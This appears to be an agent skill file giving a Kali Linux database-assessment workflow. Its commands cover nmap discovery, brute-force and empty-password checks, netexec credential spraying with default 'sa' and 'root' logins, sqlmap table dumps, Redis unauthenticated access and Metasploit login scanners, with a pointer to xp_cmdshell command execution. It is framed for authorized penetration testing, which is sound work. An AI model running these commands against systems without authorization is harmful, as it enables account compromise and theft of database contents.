---
name: kali-db-assessment
description: "Kali menu 04 — Database Assessment. Compound workflow that discovers and tests database services (MySQL, MSSQL, PostgreSQL, Oracle, MongoDB, Redis) by chaining nmap DB NSE scripts, netexec, sqlmap and Metasploit DB modules on authorized targets. Use when the user wants to find, enumerate, authenticate to, or extract data from a database they are authorized to test."
---

# Database Assessment (Kali 04)

Goal: locate database services, check for weak/default auth, enumerate contents, and test
for injection paths — on authorized systems only.

## Authorization gate
Confirm scope. Database testing can read, and sometimes modify, real data. Get explicit
written authorization before authenticating or dumping; prefer read-only enumeration first.

## Phase 1 — Discover DB services
```
nmap -p 1433,3306,5432,1521,27017,6379 -sV <target> -oA db_ports
nmap --script mysql-info,ms-sql-info,pgsql-brute,mongodb-info -p 3306,1433,5432,27017 <target>
```
Common ports: MySQL 3306, MSSQL 1433, PostgreSQL 5432, Oracle 1521, MongoDB 27017, Redis 6379.

## Phase 2 — Auth & default-credential checks
```
nmap --script mysql-empty-password -p3306 <target>
nmap --script ms-sql-empty-password,ms-sql-brute -p1433 <target>
netexec mssql <target> -u sa -p '' --local-auth            # MSSQL login test
netexec mssql <target> -u users.txt -p passwords.txt       # spray
netexec mysql <target> -u root -p rootpw                   # if netexec mysql module present
```
Redis often needs no auth: `redis-cli -h <target> ping` → `INFO` → `CONFIG GET *`.

## Phase 3 — Enumerate / extract (read-only first)
```
sqlmap -u "http://<app>/p?id=1" --dbs                      # via web injection (see kali-web-analysis)
sqlmap -u "..." -D appdb --tables
sqlmap -u "..." -D appdb -T users --dump
```
Direct client once authenticated:
`mysql -h <target> -u root -p` → `SHOW DATABASES; SELECT ... ;`
MSSQL via netexec: `netexec mssql <target> -u sa -p <pw> -x "SELECT name FROM sys.databases"`

## Phase 4 — Metasploit DB modules (optional)
```
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS <target>; run; exit"
```
Useful modules: `scanner/mysql/mysql_login`, `scanner/postgres/postgres_login`,
`admin/mssql/mssql_enum`, `scanner/mongodb/mongodb_login`.

## Output and handoff
Record: service+version, port, auth result (anon/default/cracked/none), databases and notable
tables, and any extracted credentials. Hand recovered password hashes to
**kali-password-attacks**; use any DB-admin RCE paths via **kali-exploitation**.

## Gotchas
- `--dump` can be huge and slow on the Pi — target specific tables/columns with `-C`.
- MSSQL `xp_cmdshell` enables OS command exec; only use in an authorized exploitation phase.
- Credential spraying locks accounts — check lockout policy and throttle (`--threads` low).
